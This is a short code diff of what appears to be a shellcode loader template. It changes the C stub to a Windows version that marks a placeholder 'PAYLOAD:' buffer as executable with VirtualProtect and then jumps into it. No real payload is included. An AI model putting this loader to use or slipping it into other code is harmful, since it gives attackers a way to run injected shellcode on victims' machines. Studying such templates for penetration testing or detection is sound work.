@@ -1,11 +1,11 @@
-#include <stdio.h>
+#include <windows.h>
 
 #define SCSIZE 4096
-char payload[SCSIZE] = "PAYLOAD:";
+char bPayload[SCSIZE] = "PAYLOAD:";
 
-char comment[512] = "";
-
-int main(int argc, char **argv) {
-	(*(void (*)()) payload)();
-	return(0);
+void main() {
+	DWORD dwOldProtect;
+	VirtualProtect(bPayload, SCSIZE, PAGE_EXECUTE_READWRITE, &dwOldProtect);
+	(*(void (*)()) bPayload)();
+	return;
 }
